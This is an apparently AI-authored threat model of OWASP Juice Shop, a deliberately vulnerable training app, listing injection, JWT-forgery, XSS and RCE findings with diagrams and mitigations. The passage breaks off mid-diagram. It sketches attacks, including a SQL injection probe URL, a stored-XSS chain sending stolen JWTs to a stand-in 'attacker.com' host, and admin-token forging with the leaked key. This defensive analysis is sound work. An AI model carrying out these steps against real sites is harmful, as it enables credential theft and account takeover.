# Threat Model — OWASP Juice Shop

> | | |
> |---|---|
> | **Project** | OWASP Juice Shop v19.2.1 |
> | **Description** | Probably the most modern and sophisticated insecure web application |
> | **Author** | Bjorn Kimminich (bjoern.kimminich@owasp.org) |
> | **License** | MIT |
> | **Repository** | https://github.com/juice-shop/juice-shop |
> | **Homepage** | https://owasp-juice.shop |
> | **Runtime** | Node.js 20–24, Express 4, Angular 20, SQLite, MarsDB |
> | **Tags** | OWASP, CTF, pentest, web security, vulnerable-by-design |

---

## Changelog

| Version | Date | Author | Summary |
|---------|------|--------|---------|
| 1.0 | 2026-04-13 | appsec-threat-analyst (Claude) | Initial full assessment — 29 threats (7 Critical, 12 High, 6 Medium, 4 Low), 21 mitigations |

---

## Table of Contents

1. [Management Summary](#management-summary)
2. [Critical Attack Chain](#critical-attack-chain)
3. [System Overview](#1-system-overview)
4. [Architecture Diagrams](#2-architecture-diagrams)
   - [2.1 System Context](#21-system-context)
   - [2.2 Containers](#22-containers)
   - [2.3 Components](#23-components)
   - [2.4 Technology Architecture](#24-technology-architecture)
   - [2.5 Security Architecture Assessment](#25-security-architecture-assessment)
5. [Security-Relevant Use Cases](#3-security-relevant-use-cases)
6. [Assets](#4-assets)
7. [Attack Surface](#5-attack-surface)
   - [5.1 Unauthenticated Entry Points (4)](#51-unauthenticated-entry-points-4)
   - [5.2 Authenticated Entry Points (4)](#52-authenticated-entry-points-4)
8. [Trust Boundaries](#6-trust-boundaries)
9. [Identified Security Controls](#7-identified-security-controls)
10. [Threat Register](#8-threat-register)
    - [8.1 Critical (7)](#81-critical-7)
    - [8.2 High (12)](#82-high-12)
    - [8.3 Medium (6)](#83-medium-6)
    - [8.4 Low (4)](#84-low-4)
11. [Critical Findings](#9-critical-findings)
12. [Mitigation Register](#10-mitigation-register)
    - [P1 — Immediate](#p1--immediate)
    - [P2 — This Sprint](#p2--this-sprint)
    - [P3 — Next Quarter](#p3--next-quarter)
13. [Out of Scope](#11-out-of-scope)
14. [Appendix: Run Statistics](#appendix-run-statistics)

---

## Management Summary

### Verdict

🔴 **This application is critically insecure and must not be deployed in production without a full security overhaul.** OWASP Juice Shop has, by design, seven Critical-severity vulnerabilities that individually constitute catastrophic security failures: a publicly-committed RSA private key enabling offline admin JWT forgery, SQL injection allowing complete authentication bypass, stored XSS via intentional sanitizer disablement enabling session hijacking, JWT algorithm enforcement bypass (CVE-2020-15084), MD5 password hashing making all dumped credentials immediately crackable, remote code execution via eval() and sandbox escape, and mass assignment enabling any user to self-escalate to admin. Any single one of these represents a Critical incident in a production environment. Together they represent complete and immediate compromise.

### Top Threats

| Severity | ID | Description | Impact | Mitigation | Effort |
|----------|----|-------------|--------|------------|--------|
| 🔴 | [T-001](#t-001) | SQL injection — authentication bypass and full DB dump | Complete credential theft + authentication bypass | [M-001](#m-001) — Parameterized queries | Low |
| 🔴 | [T-002](#t-002) | SQL injection — UNION-based full database extraction | All user PII, payment data, order history exposed | [M-001](#m-001) — Parameterized queries | Low |
| 🔴 | [T-004](#t-004) | JWT alg:none bypass (CVE-2020-15084) | Forge admin JWT, full privilege escalation | [M-003](#m-003) — Enforce RS256 algorithm | Low |
| 🔴 | [T-005](#t-005) | Hardcoded RSA private key in public GitHub repo | Offline admin JWT forgery for any identity | [M-004](#m-004) — Externalize key to secret manager | Medium |
| 🔴 | [T-006](#t-006) | MD5 password hashing (no salt) | All dumped passwords crackable in seconds | [M-005](#m-005) — Migrate to bcrypt | Medium |
| 🔴 | [T-010](#t-010) | RCE via notevil vm sandbox escape | Arbitrary Node.js code execution | [M-009](#m-009) — Replace eval with JSON schema | High |
| 🔴 | [T-019](#t-019) | Stored XSS + JWT in localStorage — session hijack chain | Account takeover of all visitors | [M-017](#m-017) — Remove sanitizer bypass | Low |
| 🟠 | [T-003](#t-003) | Unauthenticated access to encryption keys and logs | RSA/AES keys and server tokens exposed | [M-002](#m-002) — Restrict file serving paths | Low |
| 🟠 | [T-024](#t-024) | Admin UI — client-side guard only | Any JWT holder calls admin endpoints | [M-021](#m-021) — Server-side admin role check | Medium |
| 🟠 | [T-028](#t-028) | Mass assignment — self-escalation to admin role | Any user becomes admin with one PUT request | [M-008](#m-008) — Field filtering middleware | Medium |

> 🔴 = Critical (P1 — fix immediately) · 🟠 = High (P2 — fix in next cycle)

<blockquote style="border-left: 3px solid #dc2626; background: #fef2f2; padding: 1em 1.5em; margin: 1em 0;">

### ⚠ Worst Case Scenarios

**Complete user database exfiltration with password cracking.** An unauthenticated attacker queries `GET /rest/products/search?q='-` to dump all Users, Cards, and BasketItems tables ([T-002](#t-002)), then cracks every MD5 password hash via GPU rainbow tables within minutes ([T-006](#t-006)). All user accounts are immediately usable for credential stuffing against other services. No authentication required; no user interaction required.

**Persistent admin-level session hijacking via stored XSS.** An attacker posts a single feedback entry containing a `<script>` tag that reads localStorage and exfiltrates the JWT to attacker.com ([T-019](#t-019)). Every subsequent visitor — including administrators — who views the About page automatically delivers their session token to the attacker. The attacker then uses that admin token to call any admin endpoint directly, as no server-side admin check exists ([T-024](#t-024)). See [Critical Attack Chain](#critical-attack-chain).

**Offline admin JWT forgery via publicly-committed RSA key.** Any person who has ever cloned the public repository or pulled the Docker image already possesses the RSA private key ([T-005](#t-005)) and can sign arbitrary RS256 JWTs for any user identity, including admin, without touching the server. This attack requires no authentication, no network access, and leaves no server-side log entries.

**Remote code execution with full data access.** An authenticated attacker posts a B2B order containing a notevil sandbox escape payload ([T-010](#t-010)). Because the application runs as a single Node.js process co-located with both databases and all encryption keys, RCE immediately grants access to the SQLite database, MarsDB, all filesystem paths, and all environment variables.

</blockquote>

### Architecture Assessment

The application's security architecture is rated 🔴 Critical. The structural defects below exist independently of the individual CVEs catalogued in the Threat Register — fixing individual threats does not repair the underlying architectural failures.

| Severity | Layer | Defect | Consequence | Enables |
|----------|-------|--------|-------------|---------|
| 🔴 | Auth | JWT private key hardcoded in public source code | Key is permanently compromised; rotation requires code change | [T-004](#t-004) — JWT alg:none bypass, [T-005](#t-005) — Hardcoded RSA key |
| 🔴 | Auth | No algorithm enforcement on JWT verification | alg:none bypass (CVE-2020-15084) trivially forges any JWT | [T-004](#t-004) — JWT alg:none bypass |
| 🔴 | Data | MD5 password hashing — no salt | Every dumped hash immediately crackable | [T-006](#t-006) — MD5 password hashing |
| 🔴 | Runtime | eval() in two separate route handlers | User input directly executed as Node.js code | [T-010](#t-010) — RCE via sandbox escape, [T-015](#t-015) — SSTI in user profile |
| 🔴 | Frontend | Angular DomSanitizer explicitly bypassed | Stored XSS enabled by design in three components | [T-019](#t-019) — Stored XSS chain, [T-023](#t-023) — Missing CSP |
| 🟠 | Auth | Admin enforcement is client-side JavaScript only | Any JWT holder can call all admin API endpoints | [T-024](#t-024) — Client-side admin guard |
| 🟠 | Data | Sequelize raw query string interpolation | SQL injection bypasses ORM parameterization entirely | [T-001](#t-001) — SQL injection login, [T-002](#t-002) — SQL injection search |
| 🟠 | Data | Sequelize auto-API accepts all model attributes | Mass assignment enables role escalation | [T-028](#t-028) — Mass assignment admin escalation |

> 🔴 = Critical architectural failure · 🟠 = High structural risk

### Mitigations

#### Prioritized Mitigations

These address the Critical findings from the Top Risks table above. All are P1 — fix immediately.

| Priority | Mitigation | Addresses | Effort |
|----------|-----------|-----------|--------|
| P1 | [M-001](#m-001) — Parameterized queries | [T-001](#t-001) — SQL injection login, [T-002](#t-002) — SQL injection search | Low |
| P1 | [M-003](#m-003) — Upgrade express-jwt + enforce RS256 | [T-004](#t-004) — JWT alg:none bypass | Low |
| P1 | [M-004](#m-004) — Externalize RSA key to env/secret manager | [T-005](#t-005) — Hardcoded RSA private key | Medium |
| P1 | [M-005](#m-005) — Migrate to bcrypt (cost 12) | [T-006](#t-006) — MD5 password hashing | Medium |
| P1 | [M-009](#m-009) — Replace eval with JSON schema validation | [T-010](#t-010) — RCE via sandbox escape | High |
| P1 | [M-017](#m-017) — Remove bypassSecurityTrustHtml() calls | [T-019](#t-019) — Stored XSS chain | Low |

#### Follow-up Mitigations

These address High and Medium findings not covered by the prioritized mitigations above.

| Priority | Mitigation | Addresses | Effort |
|----------|-----------|-----------|--------|
| P2 | [M-007](#m-007) — Fix open redirect | [T-008](#t-008) — Open redirect via allowlist bypass | Low |
| P2 | [M-008](#m-008) — Enforce resource ownership | [T-007](#t-007) — IDOR on baskets/orders, [T-028](#t-028) — Mass assignment admin escalation | Low |
| P2 | [M-010](#m-010) — Bind review author to session | [T-011](#t-011) — Review author forgery | Low |
| P2 | [M-012](#m-012) — ZIP path traversal fix | [T-014](#t-014) — ZIP slip arbitrary file write | Low |
| P2 | [M-013](#m-013) — NoSQL type validation | [T-012](#t-012) — NoSQL injection in reviews | Low |
| P2 | [M-016](#m-016) — Rate limiting on login | [T-016](#t-016) — Brute-force on auth endpoints | Low |
| P2 | [M-018](#m-018) — JWT to httpOnly cookie | [T-020](#t-020) — JWT in localStorage exposed to XSS | Medium |
| P2 | [M-019](#m-019) — CORS origin restriction | [T-009](#t-009) — Wildcard CORS credential theft | Low |
| P2 | [M-020](#m-020) — Strengthen CSP | [T-023](#t-023) — Missing CSP enables XSS escalation | Low |

### Operational Strengths

Despite the critical finding density, the project has several genuine operational security investments:

| Control | What it provides | Limitation |
|---------|-----------------|-----------|
| CodeQL SAST (GitHub Actions) | Automated static analysis on every PR catches SQL injection and injection patterns at commit time | Uses mutable tag v3 (supply chain risk); intentional vulnerabilities are not flagged as defects |
| OWASP ZAP DAST | Dynamic scanning on PR provides runtime validation of attack surface changes | Intentional vulnerabilities produce true positives that suppress signal; limited to unauthenticated scan scope |
| Dependabot | Automated dependency vulnerability PRs keep transitive dependencies monitored | express-jwt@0.1.3 (CVE-2020-15084) remains despite alerts — illustrates that alert-without-remediation provides no protection |
| Helmet security headers (partial) | noSniff and frameguard reduce clickjacking and MIME-sniffing risk | xssFilter disabled; no CSP; partial Helmet is a weak compensating control |
| JWT RS256 key pair (partial) | RS256 algorithm provides asymmetric signing in principle | Key hardcoded in public repository; algorithm not enforced; provides no actual security |
| Winston structured logging | Audit trail for request processing and errors | Log directory publicly accessible without authentication (T-003, T-026); logging negated by its own exposure |
| Multer file upload MIME filter | Restricts gross file type abuse on upload endpoint | MIME type check bypassable; no content inspection; ZIP and XML processing still exposed |

**Bottom line:** The security testing infrastructure (CodeQL, ZAP, Dependabot) is present and represents genuine effort. The gap is that the intentional vulnerability design means none of these tools produce actionable signal — SAST and DAST find the issues but they are treated as expected. A production application with this CI posture would be well-positioned to detect and respond, but only if the underlying architectural failures above are first resolved.

---

## Critical Attack Chain

This section documents how the Critical-rated findings chain together. The primary chain below requires no authentication and results in full account takeover of all users.

```mermaid
graph LR
    A["Unauthenticated\nAttacker"] -->|"POST /api/Feedbacks\nscript payload"| B["T-019: Stored XSS\nabout.component.ts:119\nbypassSecurityTrustHtml"]
    B -->|"Victim visits /#/about\nscript executes"| C["T-020: JWT in localStorage\nlocalStorage.getItem('token')"]
    C -->|"HTTP GET attacker.com/?c=jwt"| D["Session Hijack\nAdmin or user token"]
    D -->|"T-024: No server-side\nadmin check"| E["Full Admin Access\nAll endpoints"]

    A2["Unauthenticated\nAttacker"] -->|"Clone public repo"| B2["T-005: Hardcoded\nRSA private key\nlib/insecurity.ts:28"]
    B2 -->|"jwt.sign admin claims"| C2["T-004: alg:none OR\nforged RS256 JWT"]
    C2 -->|"No algorithm\nenforcement"| E

    A3["Authenticated\nUser"] -->|"GET /rest/products/search?q='"| B3["T-002: SQL Injection\nroutes/search.ts:23"]
    B3 -->|"UNION dump"| C3["T-006: MD5 hashes\ninstant rainbow crack"]
    C3 --> D3["All credentials\ncompromised"]
```

**Key takeaway:** Three independent chains each reach full application compromise. Chains 1 and 2 do not require any prior credentials. Chain 2 requires only a git clone of a public repository.

| ID | Title | Component | Mitigation |
|----|-------|-----------|-----------|
| [T-001](#t-001) | SQL injection — authentication bypass | REST API | [M-001](#m-001) — Parameterized queries |
| [T-002](#t-002) | SQL injection — full database extraction | REST API | [M-001](#m-001) — Parameterized queries |
| [T-004](#t-004) | JWT alg:none bypass (CVE-2020-15084) | Auth Service | [M-003](#m-003) — Enforce RS256 algorithm |
| [T-005](#t-005) | Hardcoded RSA private key | Auth Service | [M-004](#m-004) — Externalize key to secret manager |
| [T-006](#t-006) | MD5 password hashing (no salt) | Auth Service | [M-005](#m-005) — Migrate to bcrypt |
| [T-010](#t-010) | RCE via notevil vm sandbox escape | B2B Orders | [M-009](#m-009) — Replace eval with JSON schema |
| [T-019](#t-019) | Stored XSS + JWT theft chain | Frontend SPA | [M-017](#m-017) — Remove sanitizer bypass |

---

## 1. System Overview

OWASP Juice Shop is a deliberately insecure web application maintained by the OWASP Foundation for security training, capture-the-flag events, and penetration testing practice. The application simulates a modern e-commerce platform with over 100 intentional security vulnerabilities spanning every OWASP Top 10 category. It is widely used in corporate security training programs, university courses, and security conferences.

**Architecture:** A Node.js Express monolith serves a compiled Angular SPA, a REST API, and a B2B order endpoint. Authentication is JWT-based (RS256). Data is persisted in a co-located SQLite database (via Sequelize) and an in-process MarsDB (MongoDB-compatible) instance. There is no API gateway, WAF, reverse proxy, or load balancer in the default Docker deployment.

**Users:** Security trainees, CTF participants, penetration testers, and security educators. Deployed as a public Docker image (`bkimminich/juice-shop`) to cloud environments, local VMs, and training lab networks.

**Complexity tier:** Complex — monolith with SPA, multiple data stores, file processing, and B2B integration.

**Compliance scope:** OWASP Top 10 (2021), OWASP ASVS. This threat model treats all vulnerabilities as findings that would be critical in a production application of equivalent architecture.

**Team ownership:** OWASP Juice Shop project (open source, community maintained).

**Context sources used:** None (no external context endpoint or business context file configured).

**Overall security impression:** This application is, by design, an almost complete catalog of web application security failures. The most critical findings from a production-applicability standpoint are: (1) hardcoded RSA private key enabling offline JWT forgery for any user, (2) SQL injection in the authentication endpoint allowing complete credential bypass, (3) stored XSS via explicit Angular sanitizer disablement enabling session token theft, (4) JWT algorithm enforcement bypass (CVE-2020-15084) allowing admin privilege escalation without credentials, (5) MD5 password hashing making all dumped credentials immediately crackable, (6) remote code execution via a sandbox-escaped eval path, and (7) mass-assignment vulnerability allowing any user to self-escalate to the admin role. Any single one of these would constitute a critical security incident in a production deployment.

---

## 2. Architecture Diagrams

### 2.1 System Context

The context diagram shows who interacts with Juice Shop and which external services it depends on, grouped by trust zone.

```mermaid
graph TD
    subgraph INTERNET["Public Internet — untrusted"]
        USER["fa:fa-user Security Trainee\n/ Attacker"]
        ADMIN_USER["fa:fa-user-shield Admin User"]
    end

    subgraph DMZ["DMZ / Edge"]
        DOCKER["Docker Container\nbkimminich/juice-shop"]
    end

    subgraph EXTERNAL["External Services"]
        GITHUB["GitHub\ngithub.com"]
        NPM["npm Registry\nnpmjs.com"]
        CROWDIN["Crowdin\nTranslation Platform"]
    end

    USER -->|"HTTP/HTTPS port 3000"| DOCKER
    ADMIN_USER -->|"HTTP/HTTPS port 3000\n(admin credentials)"| DOCKER
    DOCKER -->|"git push / PR\n(GitHub Actions)"| GITHUB
    GITHUB -->|"npm install\n(CI build)"| NPM
    GITHUB -->|"translation sync"| CROWDIN

%% Trust Boundary Key:
%% Public Internet -> DMZ: No WAF, no reverse proxy, no rate limiting
%% DMZ -> External: GitHub Actions OIDC; npm registry unauthenticated
```

### 2.2 Containers

The container diagram breaks the application into its deployable units and shows the protocols between them.

```mermaid
graph TD
    subgraph INTERNET["Public Internet — untrusted"]
        BROWSER["Browser\nAngular SPA"]
    end

    subgraph APP["Application Container — Docker"]
        EXPRESS["Express Server\nNode.js 20\nport 3000"]:::risk
        ANGULAR["Angular SPA Bundle\nServed statically"]
        REST["REST API\n/rest/* /api/*"]:::risk
        B2B["B2B Orders\n/b2b/v2/*"]:::risk
        FILES["File Upload\n/file-upload"]:::risk
    end

    subgraph DATA["Data Tier — in-process"]
        SQLITE["SQLite\ndata/juiceshop.sqlite"]:::risk
        MARSDB["MarsDB\nIn-memory MongoDB"]
        FS["Filesystem\nuploads/ logs/ encryptionkeys/"]:::risk
    end

    BROWSER -->|"HTTP GET static assets"| ANGULAR
    BROWSER -->|"HTTP/JSON REST calls\n+ JWT Bearer"| REST
    BROWSER -->|"HTTP POST multipart"| FILES
    EXPRESS --> REST
    EXPRESS --> B2B
    EXPRESS --> FILES
    REST -->|"Sequelize ORM\nSQL queries"| SQLITE
    REST -->|"MarsDB queries"| MARSDB
    FILES -->|"write to uploads/\nread XML/ZIP/YAML"| FS

%% Trust Boundary Key:
%% Internet -> App Container: No authentication on many routes; CORS wildcard
%% App -> Data Tier: In-process — no network boundary; SQL injection possible
```

### 2.3 Components

The component diagram details the internal structure of the Express server, showing the security-critical modules and their data flows.

```mermaid
graph TD
    subgraph AUTH["Auth Service — lib/insecurity.ts"]
        JWT_SIGN["JWT Signer\nRS256 / hardcoded key"]:::risk
        JWT_VERIFY["JWT Verifier\nexpress-jwt@0.1.3"]:::risk
        PWD_HASH["Password Hash\nMD5 (no salt)"]:::risk
        REDIRECT["Redirect Guard\nsubstring match"]:::risk
    end

    subgraph ROUTES["Route Handlers — routes/"]
        LOGIN["login.ts\nSQL injection E-001"]:::risk
        SEARCH["search.ts\nSQL injection E-002"]:::risk
        PROFILE["userProfile.ts\neval() SSTI E-007"]:::risk
        B2B_RT["b2bOrder.ts\nRCE eval E-003"]:::risk
        UPLOAD["fileUpload.ts\nXXE/ZIP/YAML E-004"]:::risk
        IMG_URL["profileImageUrlUpload.ts\nSSRF E-005"]:::risk
        REVIEWS["updateProductReviews.ts\nNoSQL injection"]:::risk
    end

    subgraph MODELS["Models — models/"]
        USER_MODEL["User model\nMD5 hash hook"]:::risk
        SEQUELIZE["Sequelize auto-API\n/api/* CRUD"]:::risk
    end

    JWT_VERIFY -->|"isAuthorized() middleware"| LOGIN
    JWT_VERIFY -->|"isAuthorized() middleware"| PROFILE
    JWT_VERIFY -->|"isAuthorized() middleware"| B2B_RT
    LOGIN -->|"SELECT query"| USER_MODEL
    PROFILE -->|"eval username"| JWT_SIGN
    SEQUELIZE -->|"PUT /api/Users"| USER_MODEL

%% Trust Boundary Key:
%% Route -> Model: Sequelize queries — raw interpolation bypasses ORM parameterization
%% JWT Signer: hardcoded private key — offline forgery possible
```

### 2.4 Technology Architecture

The technology stack diagram shows the vertical layers from client to data tier, with protocols and versions annotated on each edge.

```mermaid
graph TB
    subgraph CLIENT["Client Layer"]
        BROWSER_CLIENT["Browser\nAngular 17 SPA\nTypeScript"]
    end

    subgraph RUNTIME["Node.js Runtime — Express 4"]
        MW_CORS["CORS Middleware\ncors() — wildcard"]:::risk
        MW_HELMET["Helmet (partial)\nnoSniff + frameguard"]
        MW_JWT["JWT Middleware\nexpress-jwt@0.1.3 CVE-2020-15084"]:::risk
        MW_MULTER["Multer File Parser"]
        ROUTES_ALL["Route Handlers\nroutes/*.ts"]:::risk
        LIB_INSEC["lib/insecurity.ts\nhardcoded keys + MD5"]:::risk
    end

    subgraph STORAGE["Storage Layer — in-process"]
        SQLITE_DB["SQLite\ndata/juiceshop.sqlite\nNo encryption"]:::risk
        MARSDB_DB["MarsDB\nIn-memory\nNo persistence across restart"]
        UPLOAD_FS["Upload Directory\nuploads/\nfilesystem"]
        LOGS_FS["Log Directory\nlogs/\npublicly accessible"]:::risk
        ENC_KEYS["encryptionkeys/\npublicly accessible"]:::risk
    end

    subgraph CICD["CI/CD — GitHub Actions"]
        CODEQL["CodeQL SAST\nmutable tag v3"]
        DEPENDABOT["Dependabot\nautomated PRs"]
        ZAP_DAST["OWASP ZAP\nDAST on PR"]
    end

    BROWSER_CLIENT -->|"HTTP/HTTPS port 3000\nAngular HttpClient"| MW_CORS
    MW_CORS --> MW_HELMET
    MW_HELMET --> MW_JWT
    MW_JWT --> ROUTES_ALL
    ROUTES_ALL -->|"Sequelize SQL\nraw interpolation"| SQLITE_DB
    ROUTES_ALL -->|"MarsDB queries\nno type validation"| MARSDB_DB
    ROUTES_ALL -->|"multipart write\nXXE + ZIP extract"| UPLOAD_FS
    ROUTES_ALL --> LIB_INSEC
    LIB_INSEC -->|"RS256 sign\nhardcoded key"| ROUTES_ALL
```

### 2.5 Security Architecture Assessment

#### 2.5.1 Architecture Patterns

| Pattern | Present | Notes |
|---------|---------|-------|
| API Gateway | No | Direct Express exposure — no centralized auth/rate-limit gateway |
| BFF (Backend for Frontend) | No | SPA communicates directly with the same Express monolith |
| Defense-in-Depth | No | Single security layer — no WAF, no reverse proxy, no network segmentation |
| Separation of Concerns | Partial | Auth logic in lib/insecurity.ts but hardcoded keys blur the boundary |
| Least Privilege | No | No per-route authorization; admin role checked only client-side |
| Secrets Management | No | Hardcoded RSA key and HMAC key in source code |
| Network Segmentation | No | Database and app run in the same process in the same container |
| Secure Defaults | No | CORS wildcard, eval() enabled, noent:true, MD5 hashing |

#### 2.5.2 Key Architectural Risks

| # | Structural Risk | Impact if exploited | Linked threats |
|---|----------------|---------------------|----------------|
| 1 | Monolithic in-process database (SQLite co-located with app logic) — no network boundary between app and data | Complete data exfiltration via SQL injection without network pivoting | [T-001](#t-001), [T-002](#t-002), [T-006](#t-006) |
| 2 | No centralized input validation or sanitization layer | Each route independently vulnerable; bypass in one route does not trigger any centralized defense | [T-001](#t-001), [T-002](#t-002), [T-014](#t-014), [T-015](#t-015) |
| 3 | Hardcoded cryptographic keys in version-controlled source code | Any user who clones the repo or pulls the Docker image can forge admin JWTs | [T-004](#t-004), [T-005](#t-005), [T-007](#t-007) |
| 4 | Client-side-only authorization enforcement | All admin protections are illusory; any user can call admin endpoints directly | [T-024](#t-024), [T-028](#t-028) |
| 5 | Eval-based code execution paths open to user input | Multiple RCE/SSTI vectors require zero network privileges beyond authentication | [T-010](#t-010), [T-015](#t-015) |

#### 2.5.3 Secret Management

**Current state:** No secret management exists. The RSA private key is hardcoded as a string literal in `lib/insecurity.ts:28`. An HMAC key is hardcoded at `lib/insecurity.ts:44`. Hardcoded test credentials appear in `routes/login.ts:69-75`. All of these are committed to the public GitHub repository.

**Structural defects:** Secrets are embedded at build time (not injection time), meaning they cannot be rotated without a code change and redeploy. There is no `.env` file usage or environment variable injection for cryptographic material.

**Impact:** Any actor with repository read access (the repository is public) can extract the RSA private key and forge valid JWTs for any user identity or role without valid credentials.

**Target architecture:** Load the JWT private key from a mounted Kubernetes secret or Docker secret (`/run/secrets/jwt_private_key`). Use an environment variable (`JWT_PRIVATE_KEY`) as a fallback. Remove all hardcoded credentials. Add a CI check (gitleaks or trufflehog) to block future secret commits.

**Linked threats:** [T-005](#t-005), [T-007](#t-007)

#### 2.5.4 Authentication

**Current state:** JWT RS256 tokens are issued on login and verified by express-jwt@0.1.3. The private key is hardcoded ([T-005](#t-005)). The algorithm is not explicitly enforced ([T-004](#t-004)).

**Structural defects:** express-jwt@0.1.3 is affected by CVE-2020-15084 (alg:none bypass). The JWT payload is stored in localStorage rather than an httpOnly cookie ([T-020](#t-020)), making it accessible to any XSS payload. Passwords are MD5-hashed without salt ([T-006](#t-006)).

**Impact:** Three independent authentication bypass paths exist simultaneously: (1) forge a token with alg:none, (2) extract and use the hardcoded private key to sign any claims, (3) dump and instantly crack MD5 passwords.

**Target architecture:** Upgrade to express-jwt@8.x with `algorithms: ['RS256']` explicitly set. Replace localStorage with httpOnly Secure SameSite=Strict cookies. Migrate password hashing to bcrypt (cost factor 12+). Rotate the JWT key pair and inject via environment.

**Linked threats:** [T-004](#t-004), [T-005](#t-005), [T-006](#t-006), [T-007](#t-007), [T-020](#t-020)

The diagram below traces the trust-establishment chain from login form to JWT issuance, highlighting where each vulnerability sits.

```mermaid
graph TD
    subgraph CLIENT_AUTH["Browser — untrusted"]
        LOGIN_FORM["Login Form\nPOST /rest/user/login"]
        JWT_STORE["localStorage\ntoken (XSS-accessible)"]:::risk
        AXIOS_INT["request.interceptor.ts\nAdds Bearer token"]
    end

    subgraph SERVER_AUTH["Express — Auth Chain"]
        LOGIN_ROUTE["routes/login.ts\nSQL injection"]:::risk
        MD5_PWD["lib/insecurity.ts:43\nMD5 hash (no salt)"]:::risk
        JWT_ISSUE["lib/insecurity.ts:57\nRS256 sign\nhardcoded key"]:::risk
        JWT_MW["express-jwt@0.1.3\nCVE-2020-15084\nalg:none accepted"]:::risk
    end

    LOGIN_FORM -->|"POST email+password\nplaintext"| LOGIN_ROUTE
    LOGIN_ROUTE -->|"hash password\nMD5"| MD5_PWD
    MD5_PWD -->|"SELECT WHERE email=? AND password=?\nraw interpolation"| LOGIN_ROUTE
    LOGIN_ROUTE -->|"sign JWT\nhardcoded RSA key"| JWT_ISSUE
    JWT_ISSUE -->|"token in response body"| JWT_STORE
    JWT_STORE -->|"Authorization: Bearer token"| AXIOS_INT
    AXIOS_INT -->|"attached to all API requests"| JWT_MW
```

#### 2.5.5 Authorization and Access Control

**Current state:** Route-level authorization uses `security.isAuthorized()` (express-jwt middleware) to verify JWT presence. Admin role enforcement is implemented only as a client-side Angular route guard (`app.guard.ts:42`). No server-side role check is applied to admin API routes.

**Structural defects:** Two independent privilege escalation paths exist: (1) any user can PUT `{role:'admin'}` to `/api/Users/:id` via mass assignment ([T-028](#t-028)), (2) any authenticated user can call admin endpoints directly, bypassing the client-side guard ([T-024](#t-024)).

**Impact:** The admin role is decorative. Any authenticated user can become admin with a single HTTP request.

**Target architecture:** Implement a server-side `isAdmin()` middleware applied to all admin routes. Disable or whitelist the Sequelize auto-API `/api/Users` PUT endpoint to prevent role escalation.

**Linked threats:** [T-024](#t-024), [T-028](#t-028)

#### 2.5.6 Input Validation and Output Encoding

**Current state:** No centralized input validation layer exists. Each route handler independently handles (or fails to handle) user input. Angular's DomSanitizer is explicitly bypassed in three components using `bypassSecurityTrustHtml()`.

**Structural defects:** Raw SQL string interpolation in login and search routes ([T-001](#t-001), [T-002](#t-002)). Direct `eval()` in profile update and B2B order routes ([T-010](#t-010), [T-015](#t-015)). `noent:true` in XML parsing ([T-012](#t-012)). No type validation on NoSQL query parameters ([T-014](#t-014)). No output encoding in three Angular components ([T-019](#t-019), [T-023](#t-023)).

**Impact:** A motivated attacker has five independent paths to code execution or data exfiltration, each requiring only a standard HTTP request.

**Target architecture:** Replace all raw SQL with parameterized queries. Remove all `eval()` calls. Disable `noent` in XML parsing. Add centralized input validation middleware using Joi or Zod schemas.

**Linked threats:** [T-001](#t-001), [T-002](#t-002), [T-010](#t-010), [T-012](#t-012), [T-014](#t-014), [T-015](#t-015), [T-019](#t-019), [T-023](#t-023)

#### 2.5.7 Separation and Isolation

**Current state:** The application runs as a single Node.js process containing the Express server, all route handlers, both database clients (SQLite and MarsDB), the file processing code, and the JWT cryptographic material. There is no container-level network segmentation.

**Structural defects:** A successful RCE in any route (B2B orders, SSTI) gives full access to all database content, all environment variables, all encryption keys, and the ability to make outbound network calls. The in-process SQLite database means SQL injection also gives filesystem read access (via SQLite's `ATTACH` or `load_extension`).

**Impact:** Single-component compromise yields full application compromise. No lateral movement required.

**Linked threats:** [T-010](#t-010), [T-015](#t-015), [T-005](#t-005)

#### 2.5.8 Defense-in-Depth

**Current state:** The application has a thin single layer of security: JWT verification on selected routes, partial Helmet headers (noSniff + frameguard), and no other defensive controls. CORS is wildcard. Rate limiting is absent. There is no WAF or reverse proxy.

**Structural defects:** When JWT verification is bypassed ([T-004](#t-004), [T-005](#t-005)), no other compensating control exists. When XSS succeeds ([T-019](#t-019), [T-023](#t-023)), no CSP or httpOnly cookie limits the damage. When SQL injection succeeds ([T-001](#t-001)), no row-level security or encryption at rest limits data exposure.

**Impact:** Every vulnerability in this model has zero compensating controls.

**Linked threats:** All threats (see [T-001](#t-001) through [T-029](#t-029))

#### 2.5.9 Overall Architecture Security Rating

**Rating: 🔴 Critical gaps**

This application represents a near-complete absence of architectural security controls. The combination of hardcoded cryptographic secrets, missing algorithm enforcement on JWT verification, explicit disabling of Angular's XSS protections, eval-based execution paths, and client-side-only authorization creates multiple independent paths to full application compromise. Any single P1 mitigation addressed in isolation would still leave the application critically exposed through the remaining vectors. A production application of this architecture would require a full security architecture overhaul, not targeted patching.

---

## 3. Security-Relevant Use Cases

### Authentication Flow

This sequence shows the normal login flow from Angular SPA through the Express API to the SQLite database, highlighting the vulnerable SQL construction and MD5 hash comparison.

```mermaid
sequenceDiagram
    participant User
    participant Angular
    participant LoginRoute as routes/login.ts
    participant InsecurityLib as lib/insecurity.ts
    participant SQLite

    User->>Angular: Enter email + password
    Angular->>LoginRoute: POST /rest/user/login (email, password)
    Note over LoginRoute: MD5 hash password (lib/insecurity.ts:43)
    LoginRoute->>SQLite: SELECT * FROM Users WHERE email='${email}' AND password='${hash}'
    Note over SQLite: RAW STRING INTERPOLATION — SQL injection here
    SQLite-->>LoginRoute: User record or empty
    alt Login successful
        LoginRoute->>InsecurityLib: sign(user) — RS256 hardcoded key
        InsecurityLib-->>LoginRoute: JWT token
        LoginRoute-->>Angular: 200 OK — token in response body
        Angular->>Angular: localStorage.setItem('token', jwt)
        Note over Angular: Token stored in localStorage — XSS-extractable
    else Login failed
        LoginRoute-->>Angular: 401 Unauthorized
    end
```

### JWT Forgery Attack (Critical)

This sequence shows how an attacker forges an admin JWT offline using the publicly committed RSA private key, without any server interaction.

```mermaid
sequenceDiagram
    participant Attacker
    participant PublicGitHub as GitHub (public repo)
    participant JWTLib as jsonwebtoken
    participant AdminRoute as /rest/admin/application-version

    Attacker->>PublicGitHub: Clone repo or view lib/insecurity.ts:28
    PublicGitHub-->>Attacker: RSA private key (hardcoded)
    Attacker->>JWTLib: jwt.sign({id:1,role:'admin',...}, privateKey, {algorithm:'RS256'})
    JWTLib-->>Attacker: Valid admin JWT token
    Attacker->>AdminRoute: GET /rest/admin/* with forged JWT
    Note over AdminRoute: express-jwt@0.1.3 verifies RS256 — passes
